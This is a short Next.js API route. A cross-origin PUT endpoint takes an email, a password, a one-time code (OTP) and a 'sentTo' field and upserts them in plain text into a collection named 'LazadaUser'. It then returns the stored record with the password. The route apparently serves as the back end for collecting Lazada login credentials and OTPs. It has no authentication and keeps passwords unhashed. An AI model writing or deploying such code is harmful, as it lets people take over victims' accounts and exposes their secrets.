import { dbConnect } from "@/lib/dbConnect";
import { cors } from "@/middleware/cors";
import LazadaUser from "@/models/LazadaUser";

// export async function PUT(req, res) {
export const PUT = cors(async (req, res) => {
  await dbConnect();

  const { email, sentTo, password, otp } = await req.json();

  if (!email) {
    return new Response(JSON.stringify({ message: "Email is required" }), {
      status: 400,
    });
  }

  try {
    // Find the user by email and update the data
    const updatedUser = await LazadaUser.findOneAndUpdate(
      { email },
      { $set: { sentTo, password, otp } }, // Update with the new data
      { new: true, runValidators: true, upsert: true } // Return the updated document
    );

    if (!updatedUser) {
      return new Response(JSON.stringify({ message: "User not found" }), {
        status: 404,
      });
    }

    return new Response(
      JSON.stringify({
        message: "User updated successfully",
        user: updatedUser,
      }),
      { status: 200 }
    );
  } catch (error) {
    console.error("Error updating user:", error);
    return new Response(JSON.stringify({ message: "Internal server error" }), {
      status: 500,
    });
  }
});
